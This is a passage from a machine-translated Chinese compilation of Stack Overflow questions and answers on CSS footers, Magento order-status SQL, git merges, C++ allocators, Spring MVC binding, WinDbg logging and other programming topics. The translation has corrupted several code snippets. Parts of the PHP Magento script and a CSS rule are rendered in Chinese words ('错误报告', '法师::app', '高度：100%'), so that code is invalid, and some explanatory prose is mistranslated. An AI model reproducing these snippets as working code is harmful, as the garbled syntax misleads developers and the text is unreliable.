    private static final Logger log = Logger.getLogger(JacksonConfigurator.class.getName());

    public JacksonConfigurator() {
        super();
        log.info("Configuring JSON data field mapping to C-style");
        ObjectMapper mapper = _mapperConfig.getConfiguredMapper();
        if (mapper == null) {
            mapper = _mapperConfig.getDefaultMapper();
        }
        mapper.setPropertyNamingStrategy(PropertyNamingStrategy.CAMEL_CASE_TO_LOWER_CASE_WITH_UNDERSCORES);
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T19:38:04.187

你不应该扩展 ResteasyJacksonProvider 并在 MANIFEST 文件中包含杰克逊罐子吗？见[https://community.jboss.org/message/635233](https://community.jboss.org/message/635233)。

# css - CSS 页脚不会粘在页面底部

> ID：10338455
> 
> 赞同：9
> 
> 时间：2012-04-26T17:30:57.517
> 
> 标签：css, positioning, footer, sticky-footer

我在我的 CSS 布局中设置粘性页脚时遇到了一些困难。我一直在尝试采用[http://www.cssstickyfooter.com/](http://www.cssstickyfooter.com/)的想法，但如果 div 中的内容不够高，页脚不会停留在页面底部。

该css文件：

```
* {
 margin:0;
 padding:0;
 } 

body {
 height:100%; 
 margin:0px; 
 padding:0px;
 }

#wrap {
 min-height: 100%;
 }

#container {
 overflow:auto;
 padding-bottom: 150px;
 text-align:left;
 width:800px;
 margin:auto;
 }

#header {
 height:240px; 
 margin-top:20px;
}

#navigation {
 float:left; 
 width:800px; 
 margin-top:20px;
}

#content-container {
 float:left;
 width: 800px;
}

#left {
 clear:left; 
 float:left: 
 width:480px; 
 height: auto;
 margin: 20px 0px 20px 0px;
 padding: 20px 10px 20px 10px;
}

#right {
 float:right; 
 width:275px; 
 height:auto;
 margin: 20px 0px 20px 0px;
 padding: 20px 10px 20px 10px; 
}

#footer {
 position: relative;
 clear:both;
 height:150px;
 margin-top: -150px;
}

#columns {
 width:800px;
 height:150px;
 margin:auto;
}

#colleft {
 float:left;
 width:400px;
 height:150px;
}

#colright {
 float:right;
 position:relative;
 width:260px;
 height:150px;
} 
```

html文件：

```
<div id="wrap">

    <div id="container">

        <div id="header"></div>

        <div id="navigation">

            <div id="lang"></div>

        </div>

        <div id="content-container">

            <div id="left"></div>

            <div id="right"></div>

        </div>

    </div>

    <div id="footer">

        <div id="columns">

            <div id="colleft"></div>

            <div id="colright"></div>

        </div>
</div> 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-26T17:37:25.377

我相信你不见了

```
html { 高度：100%; }
```

来自你的 CSS。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-26T17:45:46.410

您是否考虑过使用位置：固定？

```
#footer { position: fixed; bottom: 0px; height:150px; } 
```

您的示例不起作用的原因是因为您的#footer 在 #wrap 内，使用该 CSS #footer 必须在 wrap 之外，因为它是将 min-height 设置为 100% 的 wrap 和 #使用负边距将页脚向上拉。

html 标签也需要 100% 的高度才能工作。

所以回顾一下，#footer 不能嵌套，html 需要 height: 100%;

此处示例 --- [http://jsfiddle.net/CK6nt/](http://jsfiddle.net/CK6nt/)

希望有帮助！劳里

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T17:46:25.037

在您的页脚类中：

```
#footer {
position: relative;
clear:both;
height:150px;
margin-top: -150px;
} 
```

更改`position: relative;`为，`position:fixed`因此该类应如下所示：

```
#footer {
position: fixed;
clear:both;
height:150px;
margin-top: -150px;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-07-03T07:14:52.077

对我来说一切都很好，您只需要添加`position :absolute`页脚，以便将页脚放置在正常文档流之外，`bottom:0`并帮助您将页脚带到页面下方。

```
#footer {
position:absolute;
bottom:0;
} 
```

# sql - 通过 SQL 在 Magento 中更改订单状态

> ID：10338457
> 
> 赞同：8
> 
> 时间：2012-04-26T17:31:25.100
> 
> 标签：sql, magento

我遇到了一个问题，我的第三方支付网关已将订单的已取消订单状态更改为待处理，所以现在我永远被待处理订单所困扰。

我正在与客户通电话，他说信用卡有问题，所以我取消了她的订单，当后端收到银行通知时，它变成了待处理。

那么有没有办法再次取消呢？也许通过SQL？

问候，

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-08T08:24:04.337

我正在经营企业，并设法做到了：

```
UPDATE sales_flat_order_grid SET status = 'processing';  
UPDATE sales_flat_order SET state = 'processing', status = 'processing'; 
```

有人设法清除了所有订单状态，这就是我很容易将它们取回的方式。

当然，如果您想更新特定记录，您可以`WHERE entity_id = '12345'`在查询末尾添加或其他内容。

在运行任何类似上述的查询之前，请务必备份数据库！

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2014-10-03T10:08:20.127

以前的答案缺少更新“sales_flat_order_grid”表的请求。如果问题仍然有效，完整的请求是：

```
UPDATE sales_flat_order_grid SET status = 'canceled' WHERE increment_id = <order_increment_id>;
UPDATE sales_flat_order SET state='canceled', status='canceled' WHERE increment_id =<order_increment_id> (or WHERE entity_id = <order_id>); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-05-20T11:54:25.370

向 Silas 答案添加信息：您可能需要在销售状态历史记录中插入新状态。

```
INSERT INTO sales_flat_order_status_history (`parent_id`,`is_customer_notified`,`is_visible_on_front`,`comment`,`status`,`entity_name`,`created_at`) VALUES (YOUR_ORDER_ID,0,0,'',NEW_STATUS_CODE,'order','2014-05-20 11:42:29') 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T05:43:22.433

SQL怎么样：

```
UPDATE sales_flat_order SET state="canceled", status="canceled" WHERE entity_id = {order id should be here} AND increment_id = {order increment id should be here} 
```

在此查询中，您应该指定 entity_id 或 increment_id 或两者。如你所愿。

## 警告

在更改某些内容之前备份您的数据库。我没有时间分析与订单相关的数据库结构和约束。

PHP怎么样：

从根文件夹运行以下 PHP 脚本：

```
错误报告（E_ALL）；
ini_set('display_errors', 1);
require_once('app/Mage.php');
法师::app('admin');
$order = Mage::getModel('sales/order')->loadByIncrementId($id);//id是你的订单增量id
或者
$order = Mage::getModel('sales/order')->load($id);//id是你的订单id
if ($order->getId()) {
    $order->cancel()->save();
}

```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-04-02T07:58:32.347

请考虑更改订单状态/状态是不够的：您还应该取消商品和金额信息，加入`sales_flat_order_item`.

# visual-studio-2010 - 在 Git/GitHub 中自动合并 Visual Studio 项目的问题（未解决的冲突）

> ID：10338460
> 
> 赞同：2
> 
> 时间：2012-04-26T17:31:30.927
> 
> 标签：visual-studio-2010, git, merge, github

我和一个朋友刚开始使用 git 和 GitHub 来帮助我们管理我们在 Visual Studio 2010 中工作的 C# w/XNA 项目。当只有一个人对文件进行更改时，一切正常，他的工作推动和与中央存储库正确合并。但是，当我们有两个不同的人同时处理代码并进行更改时，最后一个推送的人在尝试提取第一个人的更改时总是必须处理手动合并，因为自动合并失败了。即使我们所做的更改是不相关的，也会发生这种情况（IE 一个人添加了一个完全随机的、未使用的类，另一个人添加了第二个随机的、未使用的变量一个不同的、未使用的类）。我们可能花了 3 个小时左右的时间来解决这个问题，但无济于事。我知道有一些程序可以用来帮助促进手动合并，但我想确保不是某些设置导致了这个问题。谢谢！

编辑：我们现在在我们的存储库中使用一个 .gitignore 文件（[这里](https://github.com/github/gitignore/blob/master/CSharp.gitignore)的这个），看起来我们已经取得了一些进展。现在，当第二个人在推送他的更改之前拉到合并时，它似乎确实在他的本地副本上进行了更改（意味着他的项目文件注册了我之前所做的更改），但他仍然无法完全合并，因为他得到了以下内容他执行 git pull 时出错：

警告：无法合并二进制文件：collision/collision.suo (HEAD vs db023c2075...)

Auto-Merging collision/collision.suo CONFLICT（内容）：在collision/collision.suo中合并冲突自动合并失败。修复冲突然后提交结果。

我已经检查并且 .suo 扩展名包含在忽略文件中，所以我不知道是什么导致了这个问题。任何进一步的帮助将不胜感激，并感谢那些已经发布的人。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T06:35:01.160

好吧！我们终于解决了这个问题。显然问题出在 .gitignore 文件及其创建方式上。我之前刚刚在记事本中创建了一个文件，但我想它没有被拾取。我所做的只是使用以下命令在 git bash 中重新创建它：

触摸.gitignore

然后添加它并提交。感谢所有的建议，绝对让我朝着正确的方向前进。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T19:44:02.620

您可能没有忽略二进制和本地配置文件。您必须创建`.gitignore`文件并在其中列出您不想添加到存储库中的内容。[你可以在这里](https://stackoverflow.com/questions/2143956/gitignore-for-visual-studio-projects-and-solutions)找到更多信息

# matlab - am*n*3 矩阵是什么意思？

> ID：10338462
> 
> 赞同：2
> 
> 时间：2012-04-26T17:31:37.410
> 
> 标签：matlab, sign

> **可能重复：**
> [MATLAB 中 RGB 图像的 3 个维度是多少？](https://stackoverflow.com/questions/2612113/what-are-the-3-dimensions-of-an-rgb-image-in-matlab)

在 matlab 中，我的彩色图像采用 am*n*3 矩阵形式，3 维表示什么？如果你跳过第三维，我会丢失任何数据吗？

据我所知，在坐标 m，n 处，值是一个像素，第三维是什么？

例如是

```
B(1,2,3)=B(1,2) 
```

？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:33:08.377

第三个维度是颜色通道。它代表红色，绿色和蓝色。

B(1,2,3) 是位于第 1 行第 2 列的像素的蓝色通道。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:33:21.003

是颜色！以三元组的形式表示每种颜色的强度 (R,G,B)。如果你跳过第三个维度，你的图片将只显示一个颜色通道的阴影——我认为是红色。

# c++ - 处理自定义分配器中没有默认构造函数

> ID：10338466
> 
> 赞同：4
> 
> 时间：2012-04-26T17:31:51.970
> 
> 标签：c++, design-patterns, memory, memory-management, constructor

我的`new`宏有一个#define，以使用我自己的分配器，例如`MYNEW(Type, Allocator)`我将去哪里分配一些原始内存`malloc`，然后使用placement new在原始内存上分配类型，例如

```
#define MYNEW(Type, Allocator) Allocator->Alloc<Type>(sizeof(Type));`
template<typename Type>
Type* Alloc(unsigned int size) // Allocator::Alloc<Type>
{
    return (Type*)new(malloc(reportedSize)) Type;
} 
```

但是，当没有默认构造函数时，我遇到了问题`Type`。我尝试过的一种情况是做一些事情，比如`MYNEW_1(Type, Allocator, ConVar1)`传递 ConVar1 的地方，比如

```
#define MYNEW_1(Type, Allocator, ConVar1) Allocator->Alloc<Type>(sizeof(Type), ConVar1);`
template<typename Type, typename ConVarType>
Type* Alloc(unsigned int size, ConVarType Convar1) // Allocator::Alloc<Type>
{
    return (Type*)new(malloc(reportedSize)) Type(Convar1);
} 
```

这种方法的问题在于，对于我的自定义 Vector，我还使用 MYNEW 来分配内存。但是，对于`Type`用于我的 Vector 的某些 '，没有默认构造函数，我无法判断构造函数可能需要多少变量。

有谁知道如何解决这个问题？（当然不用说使用 std:: 类型而不是我自己的类型。我这样做是为了了解更多信息）。我不希望只是超载`operator new`，因为我在那里有内存跟踪，因为我不希望内存跟踪两次（有更多的内部跟踪`Alloc`，但我展示的是简化的示例）并且宁愿只使用 malloc。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T17:45:20.350

看来您不仅在做自己的自定义分配器，而且您也不一定要尝试定义与 STL 兼容的分配器。但是，我认为认识到 STL 分配器的所有错误都是为了处理这种情况而设计的。 [分配与](http://www.cplusplus.com/reference/std/memory/allocator/allocate/)[构造](http://www.cplusplus.com/reference/std/memory/allocator/construct/)分开：

> 请注意， [ `allocator::construct`] 不为元素分配空间，它应该已经可用`p`（请参阅`allocate`分配空间的成员）。
> 
> 它相当于[调用`new`复制现有对象的放置]。

一般来说，我相信你有两个选择：要么（1）重载`operator new`来处理分配内存并让系统处理构造，要么（2）让你的分配器接口更像STL分配器接口。

* * *

“重载`operator new`”通常用于表示两件事：（1）替换它，或（2）添加新版本的`new`. 当我最初回答时，我使用的是第一个含义（实际上应该称为“替换`operator new`”或“覆盖`operator new`”）；但仔细考虑这一点，我确定真正的重载`operator new`会满足您的要求。

我应该提到，调用重载的语法`operator delete`非常糟糕，以至于许多人仅仅因为这个原因而避免使用这种技术。`delete`您可以创建一个函数（例如`deallocate`）并使用它，而不是重载。

这种方法的价值在于您遵循将内存分配与对象构造分开的语言标准，并让编译器为您处理对象构造。您不必担心转发运算符，或没有默认构造函数的类，或任何这些问题。

重载`operator new`/ `operator delete`（当然，我依靠你来充实`track`和`release`）：

```
#include <new>
#include <cstdlib>

struct Allocator {
    void track(void* p, const void* container) const;
    void release(void* p, const void* container) const;
};

void* operator new (size_t size, const Allocator& alloc, const void* container)
{
    void* allocated_memory = std::malloc(size);
    if (!allocated_memory) {
        throw std::bad_alloc();
    }

    alloc.track(allocated_memory, container);
    return allocated_memory;
}

void operator delete(void* p, const Allocator& alloc, const void* container)
{
    alloc.release(p, container);
    std::free(p);
}

int main()
{
    Allocator alloc;
    int* i = new (alloc, NULL) int;
    operator delete(i, alloc, NULL);
} 
```

重载`operator new`和使用函数`deallocate`：

```
#include <new>
#include <cstdlib>

struct Allocator {
    void track(void* p, const void* container) const;
    void release(void* p, const void* container) const;
};

void* operator new (size_t size, const Allocator& alloc, const void* container)
{
    void* allocated_memory = std::malloc(size);
    if (!allocated_memory) {
        throw std::bad_alloc();
    }

    alloc.track(allocated_memory, container);
    return allocated_memory;
}

template<typename T> void deallocate(T* p, const Allocator& alloc, const void* container)
{
    p->~T();
    alloc.release(p, container);
    std::free(p);
}

int main()
{
    Allocator alloc;
    int* i = new (alloc, NULL) int;
    deallocate(i, alloc, NULL);
} 
```

* * *

您应该考虑的一种情况是`new`成功但构造对象失败时该怎么办。也就是说，当有足够的内存，但由于某些其他原因无法创建对象时。系统实际上足够聪明，可以调用权利`delete`（嗯，`delete`具有系统认为它应该具有的签名）来释放分配的内存；但前提是有一个`delete`带有该签名的。您可能很想重载`operator delete` **并**提供一个`deallocate`函数，其中一个是根据另一个定义的：

```
void operator delete(void* p, const Allocator& alloc, const void* container)
{
    alloc.release(p, container);
    std::free(p);
}

template<typename T> void deallocate(T* p, const Allocator& alloc, const void* container)
{
    p->~T();
    operator delete(p, alloc, container);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:52:06.587

这是我使用可变参数模板和宏的解决方案。

```
#include <cstdlib>
#include <new>
#include <iostream>
using namespace std;

#define MYNEW(Allocator, ...) (Allocator)->Alloc(__VA_ARGS__);

template<typename Type>
struct Allocator{
    template<typename... Args>
    Type* Alloc(Args... args){
        cout<<"weird allocator"<<endl;
        return new(malloc(sizeof(Type))) Type(args...);
    }
};

struct test{
    test(int a, bool b, const char* c){
        cout<<"test constructor with a="<<a<<", b="<<b<<", c="<<c<<endl;
    }
};

int main(){
    Allocator<test> myallocator;
    test* obj=MYNEW(&myallocator, 3, true, "hello");
} 
```

就个人而言，我认为没有可变参数的东西没有一个干净的解决方案（阅读，不需要你明确地写下`Allocator`会做什么，在你分配对象的地方）。

您还可以查看将其他参数（指向内存的指针除外）传递给新的运算符重载（[是的，这是可能的](http://en.cppreference.com/w/cpp/memory/new/operator_new)）。

# jquery - 无论包含块计算位置

> ID：10338471
> 
> 赞同：1
> 
> 时间：2012-04-26T17:32:18.633
> 
> 标签：jquery, html, css

我有`<table>`几个`<div>`标签：

```
<div class=outer>
  <div class=inner>
    <table>
      <tbody>
        <tr><td>col1</td><td>col2</td></tr>
        <tr><td>col1</td><td>col2</td></tr>
      </tbody>
    </table>
  </div>
</div> 
```

如果使用 jQuery`$.fn.position`函数获取行的位置：

```
console.log($('tr:first').position().top); 
```

`div.inner`根据我是否设置为`position: relative`（[示例](http://jsbin.com/opakew/8/edit)），它将返回不同的值。我相信这是因为行的[包含块](http://www.w3.org/TR/CSS2/visuren.html#containing-block)在每种情况下都不同。

我需要计算行相对于身体的位置，而不管是否`div.inner`将位置设置为`relative`. 有没有一种优雅的方法来实现这一点？或者我是否需要提升 DOM 树，检查每个祖先是否为`position: relative`，并在此基础上添加一个偏移量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:45:26.440

我想你 console.log($('tr:first').offset().top);

# forms - 调试 Spring MVC 集合绑定

> ID：10338472
> 
> 赞同：1
> 
> 时间：2012-04-26T17:32:25.053
> 
> 标签：forms, debugging, spring-mvc, binding, collections

我有一个非常简单的用户设置表单：

```
<form:form method="post" id="fm1" cssClass="fm-v clearfix" commandName="${commandName}" htmlEscape="true">
  <div class="row fl-controls-left">
    <spring:message code="screen.userSettings.label.timeZone.accesskey" var="timeZoneAccessKey" />
    <label for="timeZone" class="fl-label"><spring:message code="screen.userSettings.label.timeZone" /></label>
    <form:select id="timeZone" path="timeZone" accesskey="${timeZoneAccessKey}">
      <form:options items="${user.supportedTimeZones}" itemLabel="label" itemValue="id" />
    </form:select>

    <c:forEach items="${user.answers}" var="answer" varStatus="loop">
      <div class="row fl-controls-left">
        <form:select path="answers[${loop.index}].questionId">
          <option value="-1"><spring:message code="screen.userSettings.question.selectOne" /></option>
          <form:options items="${user.supportedQuestions}" itemLabel="question" itemValue="id" />
        </form:select>
        <form:input path="answers[${loop.index}].answer" size="30" autocomplete="false" htmlEscape="true" type="text" cssClass="required" cssErrorClass="error"/>
      </div>
    </c:forEach>
  </div>
</form:form> 
```

基本上，您可以设置您的时区，并提供*忘记密码*问题列表的答案。绑定到这个表单的模型对象基本上是这样的：

```
public class User implements Serializable {
    private static final long serialVersionUID = 8974875234954842283L;

    private List<Answer> answers;
    private List<Question> supportedQuestions;
    private List<TimeZone> supportedTimeZones;
    private String timeZone;

    public User() {
        credentials = new UsernamePasswordCredentials();
    }

    public List<Answer> getAnswers() {
        return answers;
    }

    public List<Question> getSupportedQuestions() {
        return supportedQuestions;
    }

    public List<TimeZone> getSupportedTimeZones() {
        return supportedTimeZones;
    }

    public String getTimeZone() {
        return timeZone;
    }

    public void setAnswers( List<Answer> answers ) {
        this.answers = answers;
    }

    public void setSupportedQuestions( List<Question> supportedQuestions ) {
        this.supportedQuestions = supportedQuestions;
    }

    public void setSupportedTimeZones( List<TimeZone> supportedTimeZones ) {
        this.supportedTimeZones = supportedTimeZones;
    }

    public void setTimeZone( String timeZone ) {
        this.timeZone = timeZone;
    }

    ...
} 
```

表格显示得很好。它提供了一个下拉菜单，显示所有受支持的时区，后跟几行问题/答案对，问题是包含所有受支持问题的下拉菜单。当我提交回表单时，处理失败，因为`List<Answer> answers`没有使用表单中的值进行更新。我的问题有两个方面，首先，我做错了什么？其次，将来我应该如何调试此类映射问题？

我尝试使用调试器单步执行代码。`setTimeZone()`使用表单中的值调用该方法，但该`setAnswers()`方法不是。`setQuestionId()`类的or`setAnswer()`方法也不是`Answer`。我查看了该`Request`对象，它具有所有`answer[x].questionId`和`answer[x].answer`参数的键，但不确定值是什么。您建议如何追踪此类问题？

- - - - - - - - - - - - - 更新 - - - - - - - - - - - - ---------

我刚刚从调试器中提取了这个：

```
map[
'answers[4].questionId' -> 'cn=honeymoon,ou=questions,dc=company'
'answers[2].questionId' -> 'cn=honeymoon,ou=questions,dc=company'
'answers[0].questionId' -> 'cn=firstPet,ou=questions,dc=company'
'lt' -> 'LT-786e9b77-efbd-f302-062e-90364cc4634aZe1s2'
'answers[1].answer' -> 'qwer'
'answers[3].answer' -> 'poiu'
'submit' -> 'Save'
'answers[3].questionId' -> 'cn=honeymoon,ou=questions,dc=company'
'answers[1].questionId' -> 'cn=mothersMaiden,ou=questions,dc=company'
'answers[2].answer' -> 'zxcv'
'answers[4].answer' -> 'lkjh'
'timeZone' -> 'America/New_York'
'_eventId' -> 'submit'
'answers[0].answer' -> 'asdf'
] 
```

它是 requestParameterMap 中包含的内容。很明显，它显示为`answers`（`questionId`和`answer`）返回了值。为什么 spring 不调用`setAnswers()`模型对象（记住它`setTimeZone()` *被*调用了）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T22:13:39.543

这原来是 viewState 中的活页夹的问题。看起来这应该有效：

```
<binder>
  <binding property="answers" />
  <binding property="timeZone" />
</binder> 
```

因为`answers`是绑定模型对象的属性。但是，我实际上必须指定列表中元素的属性：

```
<binder>
  <binding property="answers[0].questionId" />
  <binding property="answers[0].answer" />
  <binding property="answers[1].questionId" />
  <binding property="answers[1].answer" />
  <binding property="answers[2].questionId" />
  <binding property="answers[2].answer" />
  <binding property="answers[3].questionId" />
  <binding property="answers[3].answer" />
  <binding property="answers[4].questionId" />
  <binding property="answers[4].answer" />
  <binding property="timeZone" />
</binder> 
```

对我来说，这将起作用（目前），因为我有固定大小的元素数量。必须包含列表中每个元素的每个属性有点痛苦，但它有效。有为此提交的[错误/功能请求应该使它更容易，但在那之前......](https://jira.springsource.org/browse/SWF-1065)

# c# - 在windbg中使用Logger.exe打印方法调用

> ID：10338488
> 
> 赞同：2
> 
> 时间：2012-04-26T17:33:39.920
> 
> 标签：c#, logging, windbg, sos

我需要 windbg 使用 Logger.exe 打印方法调用。

在分析 Logexts.dll 后，我了解到**!logexts.logm i sampleapplication.dll**会将 sampleapplication.dll 中的调用打印到 windbg 屏幕上。

但我看不到在 sampleapplication.dll 中进行的方法调用。我怎么做？

假设如果在sampleapplication中有一个方法print()，当这个方法被调用时，它应该打印在windbg屏幕中。

我怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-08-31T19:50:48.380

LogExts.dll 扩展将仅记录在 WinDBG 文件夹的 winext\manifest 内的“头”文件中指定的调用。它只能记录本机/非托管调用（即，没有 .NET/托管的东西）。

我是这个工具的原作者……它写于 1999 年，很多清单都反映了当时存在的 Microsoft API。最初的目的是调试第三方应用程序，以找出如何使它们与最终成为 Windows XP 的东西兼容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T19:54:11.810

所以你想记录输出到 WinDbg 输出窗口？使用以下内容：

```
!logexts.logo e d 
```

这将启用日志记录并应输出到输出窗口

您列出的用于创建模块包含或排除列表（来自 F1 帮助）：

!logexts.logm 扩展创建或显示模块包含列表或模块排除列表。

```
 !logexts.logm i Modules 
!logexts.logm x Modules 
!logexts.logm 
```

**参数**

`i` 使 Logger 使用模块包含列表。它将由指定的模块组成。

`x` 使 Logger 使用模块排除列表。它将由 Logexts.dll、kernel32.dll 和指定的模块组成。

`Modules` 指定要包含或排除的模块。此列表不是累积的；每次使用此命令都会创建一个全新的列表。如果列出了多个模块，请用空格分隔它们。星号 (*) 可用于表示所有模块。

备注 如果没有参数，!logexts.logm 扩展名会显示当前包含列表或排除列表。

扩展名 !logexts.logm x * 和 !logexts.logm i 是等价的：它们导致一个完全空的包含列表。

扩展名 !logexts.logm i * 和 !logexts.logm x 是等效的：它们会生成一个仅包含 Logexts.dll 和 kernel32.dll 的排除列表。这两个模块总是被排除在外，因为 Logger 不允许记录自己。

这里有些例子：

```
0:001> !logm
Excluded modules:
  LOGEXTS.DLL      [mandatory]
  KERNEL32.DLL     [mandatory]
  USER32.DLL
  GDI32.DLL
  ADVAPI32.DLL

0:001> !logm x winmine.exe
Excluded modules:
  Logexts.dll      [mandatory]
  kernel32.dll     [mandatory]
  winmine.exe

0:001> !logm x user32.dll gdi32.dll
Excluded modules:
  Logexts.dll      [mandatory]
  kernel32.dll     [mandatory]
  user32.dll
  gdi32.dll

0:001> !logm i winmine.exe mymodule2.dll
Included modules:
  winmine.exe
  mymodule2.dll 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-28T20:02:13.333

@EdChum：

日志可见。但不是方法调用。

我在表单上有一个按钮。单击该按钮时，我正在调用 method1() 。但是在记录中我只看到这个，

```
`Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "GetDlgItem") -> 0x77648510
Thrd 1bcc 0012B8A9 GetDlgItem( 0x0001083A 0x00000000) -> NULL [FAIL]
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "IsWindowVisible") -> 0x77656939
Thrd 1bcc 009718E6 IsWindowVisible( 0x0001083C) -> TRUE
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "IsWindowEnabled") -> 0x7764C921
Thrd 1bcc 009718E6 IsWindowEnabled( 0x0001083C) -> TRUE
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "SetCapture") -> 0x77676B2A
Thrd 1bcc 0012BBFE SetCapture( 0x0001083C) -> NULL [FAIL]
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "NotifyWinEvent") -> 0x7765F299
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "InvalidateRect") -> 0x77657BC9
Thrd 1bcc 00972610 InvalidateRect( 0x0001083C [0x0024E88C] -> 0 , 0 , 75 , 23  FALSE) -> TRUE
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "MapWindowPoints") -> 0x77657915
Thrd 1bcc 009726C7 MapWindowPoints( 0x0001083C NULL 0x00000001) -> 16711916 ( [0x01B30B24] -> 286 , 269 )
Thrd 1bcc 00972610 InvalidateRect( 0x0001083C [0x0024E804] -> 0 , 0 , 75 , 23  FALSE) -> TRUE
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "UpdateWindow") -> 0x77652BD9
Thrd 1bcc 009718E6 UpdateWindow( 0x0001083C) -> TRUE
Thrd 1bcc 009726C7 MapWindowPoints( 0x0001083C NULL 0x00000001) -> 16711916 ( [0x01B32AE8] -> 286 , 269 )
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "WindowFromPoint") -> 0x77676D0C
Thrd 1bcc 0012B98C WindowFromPoint( 286 269) -> 0x0001083C
Thrd 1bcc 7243DD89 GetProcAddress( 0x77640000 "ReleaseCapture") -> 0x7764C49E
Thrd 1bcc 0012B11F ReleaseCapture() -> TRUE 
```

# facebook - 权限问题：获取安装了我的 FB 应用程序的用户的朋友的相册和照片等信息

> ID：10338493
> 
> 赞同：0
> 
> 时间：2012-04-26T17:33:53.640
> 
> 标签：facebook, facebook-graph-api, permissions

如何获取安装了我的 FB 应用程序的用户的朋友的相册和照片等信息？问题是权限问题，因为我可以获得有关安装我的应用程序的用户的信息？顺便说一句，它授予了永久访问令牌的权限，我将它保存在我的数据库中。

这是场景：用户安装了我的 FB 应用程序并正在使用我的应用程序，并且假设看到安装了我的应用程序的另一个用户的朋友的照片。当用户安装我的应用程序时，它需要“offline_access”，以便应用程序可以获取数据，例如用户朋友的照片。

这是我用来获取用户个人资料照片的代码：

```
FB.api('/' + userID + '/albums', function (response) {
            for (album in response.data) {

                // Find the Profile Picture album
                if (response.data[album].name == "Profile Pictures") {

                    // Get a list of all photos in that album.
                    FB.api(response.data[album].id + "/photos", function (response) {

                        //The image link
                        var arrayOfPhotos = '';
                        var numberOfPhotos = 0;
                        var image_url = new Array();
                        for (photo in response.data) {
                            //here I have some code to show the photos...
                        }
                    });
                }
            }
        }); 
```

当用户 ID 是安装应用程序的用户但不适用于未安装应用程序的用户时，此代码非常有效。显然，安装该应用程序的用户可以访问他们的朋友照片......那么我如何代表安装了我的应用程序但不是登录的用户执行此任务..

谢谢。我希望我的问题很清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:52:35.870

您尝试做的事情违反了 FB 政策：

请参阅[https://developers.facebook.com/policy/#policies](https://developers.facebook.com/policy/#policies)

> 二、4\. 用户的朋友数据只能在用户对您的应用程序的体验中使用。

因此，您的应用程序试图向用户 A 显示用户 B 的朋友的照片将无法运行。

# java - 如何将计数器添加到 GUI

> ID：10338494
> 
> 赞同：1
> 
> 时间：2012-04-26T17:34:01.163
> 
> 标签：java, swing, user-interface, counter

我希望将计数器添加到我的按钮我还想学习如何设置每个计数器，以便一旦它达到我在

```
package layout;

import java.awt.Component;
import java.awt.Container;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;

public class BoxLayoutDemo {
    public static void addComponentsToPane(Container pane) {
        pane.setLayout(new BoxLayout(pane, BoxLayout.Y_AXIS));
    addAButton("Section 1", pane);
    addAButton("Section 2", pane);
    addAButton("Section 3", pane);
    addAButton("Section 4", pane);
    addAButton("Section 5", pane);
    addAButton("Section 6", pane);
    addAButton("Section 7", pane);
    addAButton("Section 8", pane);
    addAButton("Section 9", pane);
}

private static void addAButton(String text, Container container) {
    JButton button = new JButton(text);
    button.setAlignmentX(Component.CENTER_ALIGNMENT);
    container.add(button);
}

private static void createAndShowGUI() {

    JFrame frame = new JFrame("Counter");
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    addComponentsToPane(frame.getContentPane());

    frame.pack();
    frame.setVisible(true);
}

public static void main(String[] args) {
    javax.swing.SwingUtilities.invokeLater(new Runnable() {
        public void run() {
            createAndShowGUI();
        }
    });
}
}
` 
```

请帮助我是一个菜鸟，我花了几个星期才找到如何做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:50:48.897

在您的代码中，您已向容器添加了一个按钮，但尚未向该按钮添加任何侦听器 - 因此单击它不会执行任何操作...

```
private static void addAButton(String text, Container container) { 
    JButton button = new JButton(text); 
    button.setAlignmentX(Component.CENTER_ALIGNMENT); 
    container.add(button); 
} 
```

所以你需要给你的按钮添加一个 ActionListener，让它增加一个计数器。在您的动作侦听器中，您可以添加一个计数器。

新代码可能如下所示：

```
private static void addAButton(String text, Container container) { 
    JButton button = new JButton(text); 
    button.setAlignmentX(Component.CENTER_ALIGNMENT); 
    button.addActionListener(new ButtonListener());
    container.add(button);
} 

class ButtonListener implements ActionListener {
    int numClicks;
    static int buttonClicks = 0;
    ButtonListener() {
        numClicks = 0;
    }
    public void actionPerformed(ActionEvent e) {
        buttonClicks++;
        numClicks++;
        // do some action
    }
    public int getNumClicks() { return numClicks; }
    static public int getButtonClicks() { return buttonClicks; }
} 
```

在这个例子中，我添加了两个方法：
1) getNumClicks()：获取此 ButtonListener 实例中的点击次数（只要为每个按钮添加一个新的 ButtonListener，这对于每个按钮都是唯一的。）
